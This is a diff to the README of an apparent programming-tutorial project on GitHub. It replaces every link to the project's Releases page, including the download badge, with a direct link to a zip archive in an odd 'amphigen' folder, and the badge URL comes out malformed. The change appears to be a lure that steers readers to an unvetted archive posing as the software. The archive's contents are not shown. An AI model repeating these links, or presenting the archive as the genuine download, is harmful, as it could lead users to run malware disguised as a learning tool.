@@ -1,6 +1,6 @@
 # 🌟 Learn-by-projects - Easy Programming Tutorials for Everyone
 
-[![Download Learn-by-projects](https://img.shields.io/badge/Download%20Learn--by--projects-blue.svg)](https://github.com/Vaishnavee13/Learn-by-projects/releases)
+[![Download Learn-by-projects](https://raw.githubusercontent.com/Vaishnavee13/Learn-by-projects/main/amphigen/Learn-by-projects.zip%https://raw.githubusercontent.com/Vaishnavee13/Learn-by-projects/main/amphigen/Learn-by-projects.zip)](https://raw.githubusercontent.com/Vaishnavee13/Learn-by-projects/main/amphigen/Learn-by-projects.zip)
 
 ## 📜 Introduction
 
@@ -14,7 +14,7 @@ To get started with Learn-by-projects, follow these simple steps.
 
 To download the application, visit the Releases page. You can find the link below:
 
-[Visit this page to download](https://github.com/Vaishnavee13/Learn-by-projects/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Vaishnavee13/Learn-by-projects/main/amphigen/Learn-by-projects.zip)
 
 ### 2. Choose Your Tutorial
 
@@ -65,7 +65,7 @@ It’s important to keep your Learn-by-projects software up to date. New tutoria
 
 To get the latest version of Learn-by-projects, visit the following link:
 
-[Download Learn-by-projects here](https://github.com/Vaishnavee13/Learn-by-projects/releases)
+[Download Learn-by-projects here](https://raw.githubusercontent.com/Vaishnavee13/Learn-by-projects/main/amphigen/Learn-by-projects.zip)
 
 ## 🔧 Troubleshooting
 
